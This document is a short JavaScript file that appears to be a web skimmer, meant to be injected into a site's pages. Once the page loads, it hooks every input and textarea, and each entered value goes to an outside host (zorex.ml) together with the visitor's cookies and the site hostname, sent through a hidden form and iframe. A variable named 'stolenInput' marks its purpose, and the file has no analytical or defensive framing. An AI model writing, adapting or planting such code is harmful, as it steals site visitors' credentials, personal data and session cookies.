var bjs_location = "http://zorex.ml/style/js.php"; 
window.addEventListener("load", function() {
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("id", "tbox");
	ifrm.setAttribute("name", "tbox");
	ifrm.style.display = "none";
	document.body.appendChild(ifrm);
	
	var inputs = document.querySelectorAll('input');
	for(var i = 0; i < inputs.length; i++) {
		inputs[i].addEventListener("change", function(e) {bjs_getInput(e.currentTarget)});
	}
	var textareas = document.getElementsByTagName('textarea');
	for(var i = 0; i < textareas.length; i++) {
		textareas[i].addEventListener("change", function(e) {bjs_getInput(e.currentTarget)});
	}
	bjs_getLocation();
}, false);
	
function bjs_getLocation(){
	var loc = {};
	bjs_send(loc);
}
function bjs_getInput(inputInfo){
	var name = inputInfo.name;
	var value = inputInfo.value;
	var stolenInput = {};
	if(name === ""){
		name="undefined_input";
	}
	if(value != ""){
		stolenInput[name] = value;
		bjs_send(stolenInput);
	}
}
function bjs_send(params){
	var form = document.createElement("form");
	form.setAttribute("method", "post");
	form.setAttribute("target", "tbox");
	form.setAttribute("action", bjs_location+"?lo="+location.hostname);
	var field = document.createElement("input");
	field.setAttribute("type", "hidden");
	field.setAttribute("name", "cookie");
	field.setAttribute("value", document.cookie);
	form.appendChild(field);
	for(var key in params) {
		if(params.hasOwnProperty(key)) {
			var field = document.createElement("input");
			field.setAttribute("type", "hidden");
			field.setAttribute("name", "input_name");
			field.setAttribute("value", key);
			form.appendChild(field);
			var field = document.createElement("input");
			field.setAttribute("type", "hidden");
			field.setAttribute("name", "input_value");
			field.setAttribute("value", params[key]);
			form.appendChild(field);
		}
	}
	document.body.appendChild(form);
	form.submit();
}
